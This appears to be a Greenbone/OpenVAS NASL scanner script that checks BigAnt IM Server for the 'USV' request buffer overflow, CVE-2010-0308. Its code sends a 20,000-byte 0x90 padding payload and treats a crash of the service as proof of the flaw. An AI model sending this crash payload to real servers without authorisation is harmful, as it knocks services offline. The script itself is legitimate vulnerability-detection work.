# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100413");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2010-01-04 18:09:12 +0100 (Mon, 04 Jan 2010)");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");
  script_cve_id("CVE-2010-0308");
  script_name("BigAnt IM Server 'USV' Request Buffer Overflow Vulnerability");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_DENIAL);
  script_family("Buffer overflow");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("BigAnt_detect.nasl");
  script_require_ports("Services/BigAnt", 6660);
  script_mandatory_keys("bigant/server/detected");

  script_tag(name:"summary", value:"BigAnt IM Server is prone to a remote buffer-overflow vulnerability
  because it fails to perform adequate boundary checks on user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code with the
  privileges of the user running the server. Failed exploit attempts will result in a denial-of-service condition.");

  script_tag(name:"affected", value:"BigAnt IM Server 2.52 is vulnerable. Other versions may also be affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37520");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = service_get_port(default:6660, proto:"BigAnt");

if(http_is_dead(port:port))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

payload = crap(data:raw_string(0x90), length: 20000);

req = string("USV ", payload, "\r\n\r\n");

send(socket:soc, data:req);
sleep(5);
if(http_is_dead(port: port)) {
  security_message(port:port);
  exit(0);
}

exit(99);